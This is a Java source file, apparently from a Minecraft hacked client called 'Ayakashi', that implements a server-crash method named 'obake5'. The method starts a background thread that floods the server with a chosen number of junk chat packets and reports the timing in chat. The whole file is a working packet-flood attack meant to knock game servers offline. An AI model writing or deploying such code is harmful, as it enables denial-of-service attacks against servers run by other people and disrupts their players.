package Ayakashi.methods.impl;

import Ayakashi.helpers.ChatHelper;
import Ayakashi.methods.Crash;
import Ayakashi.methods.CrashInfo;
import Ayakashi.mods.notifications.Notification;
import Ayakashi.mods.notifications.NotificationManager;
import Ayakashi.mods.notifications.NotificationType;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import java.util.Random;

@CrashInfo(
        name = "obake5"
)
public class CrashObake5 extends Crash {
    public void execute(Object... args) {
        int packets = (Integer) args[0];
        long start = System.currentTimeMillis();
        NotificationManager.show(new Notification(NotificationType.INFO, ChatHelper.fix("&4Ayakashi"), "Obake method started!", 4));
        ChatHelper.sendMessage(String.format("Sending packets &8(&f%s&8) &8[&f%s&8]", this.getName().toUpperCase(), args[0]));

        (new Thread(() -> {
            try {
                for (int i = 0; i < packets; ++i) {
                    Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C01PacketChatMessage((new Random()).toString()));
                }
            } catch (Exception ignored) {
            }
        })).start();
        ChatHelper.sendMessage(String.format("Packets has been sent &8(&f%sms&8)", System.currentTimeMillis() - start));
    }
}
